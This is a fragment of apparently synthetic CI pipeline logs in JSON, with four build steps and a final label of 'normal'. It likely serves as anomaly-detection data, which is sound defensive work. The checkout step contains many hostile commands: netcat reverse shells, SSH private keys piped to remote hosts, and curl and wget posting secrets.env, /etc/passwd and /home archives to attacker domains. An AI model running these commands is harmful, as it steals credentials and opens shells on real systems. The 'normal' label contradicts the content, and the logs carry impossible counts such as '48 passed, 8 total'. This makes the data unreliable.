        "started_at": "2025-12-09T12:48:51.171835",
        "finished_at": "2025-12-09T12:48:56.661496",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "npm notice: package.json updated",
          "Transforming 630 files...",
          "[12:47:20] INFO: Connecting to database",
          "Using Python 3.9",
          "GET /status - 201 (88ms)",
          "Creating production build...",
          "Step 15/24: Building",
          "Waiting...",
          "[12:47:20] WARN: Deprecated API usage",
          "Pulling image: node:latest",
          "[12:47:20] DEBUG: Loading configuration",
          "Minifying app.js",
          "WARNING: webpack has known vulnerabilities",
          "Verifying...",
          "Step 18/18: Installing dependencies",
          "Ready.",
          "Already up to date.",
          "TLS handshake completed",
          "Cache invalidated: build",
          "Test Suites: 48 passed, 8 total",
          "Environment: test",
          "[12:47:20] WARN: Deprecated API usage",
          "\u2713 validate completed",
          "Generating source maps...",
          "Snapshots: 24 passed, 46 total",
          "Step 3/23: Installing dependencies",
          "npm install: resolved 695 packages",
          "HEAD is now at d6d8c1d",
          "HEAD is now at 4ebfef8",
          "Step 14/19: Building",
          "WARNING: lodash has known vulnerabilities",
          "Cache miss for key-7594",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-09T12:48:56.661496",
        "finished_at": "2025-12-09T12:49:02.151157",
        "log_lines": [
          "=== Step: setup_node ===",
          "Environment: test",
          "[12:47:20] WARN: Deprecated API usage",
          "Optimizing 38 modules...",
          "Step 5/17: Running migrations",
          "GET /health - 201 (16ms)",
          "\u2717 build failed with exit code 88",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Verifying...",
          "Image pulled successfully",
          "Fetching from https://pypi.org/package.json",
          "Exception: TypeError",
          "[12:47:20] DEBUG: Memory usage: 704MB",
          "  PASS: unit/test_api_health.spec.js",
          "Step 17/24: Linting",
          "GET /api - 200 (74ms)",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Completed.",
          "Pulling image: python:3.11",
          "Ran 149 tests in 9s",
          "Artifact uploaded: dist.zip (1MB)",
          "NODE_ENV=test",
          "Using Python 3.11",
          "[12:47:20] INFO: Processing request",
          "Finished.",
          "Loading...",
          "Artifact downloaded: 40MB",
          "[12:47:20] DEBUG: Memory usage: 1076MB",
          "[12:47:20] DEBUG: Query executed in 27ms",
          "Image pulled successfully",
          "Optimizing 26 modules...",
          "pip: Installing build dependencies...",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-09T12:49:02.151157",
        "finished_at": "2025-12-09T12:49:07.640818",
        "log_lines": [
          "=== Step: type_check ===",
          "Pulling image: python:3.11",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "Building Docker image...",
          "Using Python 3.11",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip: Installing build dependencies...",
          "npm notice: package.json updated",
          "\u2713 Step 'checkout' succeeded",
          "Artifact downloaded: 37MB",
          "Creating production build...",
          "Using Python 3.11",
          "Artifact downloaded: 24MB",
          "Step 13/24: Linting",
          "Switched to branch 'bugfix/task-259'",
          "Step 3/24: Installing dependencies",
          "\u2713 validate completed",
          "Compiling utils/utils.go...",
          "[12:47:20] INFO: Processing request",
          "Using Node.js 16.14.6",
          "Platform: darwin-arm64",
          "Processing...",
          "Platform: win32-x64",
          "[12:47:20] DEBUG: Query executed in 97ms",
          "yarn add: Done in 16.46s",
          "WARNING: jest has known vulnerabilities",
          "WARNING: axios has known vulnerabilities",
          "Layer 9/13: ENV command",
          "WARNING: express has known vulnerabilities",
          "Finished.",
          "Layer 1/15: COPY command",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-09T12:49:07.640818",
        "finished_at": "2025-12-09T12:49:09.836682",
        "log_lines": [
          "=== Step: checkout ===",
          "Connection established",
          "Sending 170MB of data to data-exfil.ru",
          "pip install: Successfully installed prettier-5.14",
          "TLS handshake completed",
          "  PASS: test_db_connect (30ms)",
          "Sending 500MB of data to evil-server.cc",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "[12:47:20] DEBUG: Connection pool: 5 active",
          "yarn add: Done in 28.21s",
          "POST /data - 200 (189ms)",
          "\u2713 Task completed in 1925ms",
          "npm notice: package.json updated",
          "[12:47:20] DEBUG: Query executed in 18ms",
          "nc -e /bin/sh 101.216.129.66 56907",
          "nc -e /bin/sh 89.112.148.37 24865",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 236.193.129.182 52142",
          "Sending 468MB of data to malicious-pool.xyz",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "[12:47:20] DEBUG: Connection pool: 4 active",
          "nc -e /bin/sh 38.221.211.186 9794",
          "Pulling image: python:3.11",
          "pip: Installing build dependencies...",
          "Sending 300MB of data to malicious-pool.xyz",
          "Switched to branch 'bugfix/task-240'",
          "Bundling runtime.css",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 219.30.254.191 27195",
          "GET /api - 204 (24ms)",
          "Coverage: 81% statements, 68% branches",
          "Using Python 3.12",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 120.204.252.150 5770",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 147.144.64.45 19820",
          "Snapshots: 35 passed, 4 total",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "pip install: Successfully installed axios-5.2",
          "HEAD is now at 18fe86e",
          "[12:47:20] DEBUG: Query executed in 48ms",
          "nc -e /bin/sh 235.171.243.155 12043",
          "Sending 14MB of data to crypto-mine.io",
          "Transforming 672 files...",
          "Sending 385MB of data to malicious-pool.xyz",
          "\u2717 build failed with exit code 21",
          "[12:47:20] INFO: Connecting to database",
          "nc -e /bin/sh 208.221.237.61 56830",
          "\u2717 build failed with exit code 114",
          "GET /status - 201 (81ms)",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "GET /api - 201 (40ms)",
          "Sending 289MB of data to malicious-pool.xyz",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "Step 13/22: Installing dependencies",
          "Compiling lib/utils.go...",
          "nc -e /bin/sh 47.178.211.148 3842",
          "Snapshots: 41 passed, 3 total",
          "Connection established",
          "=== Step checkout completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}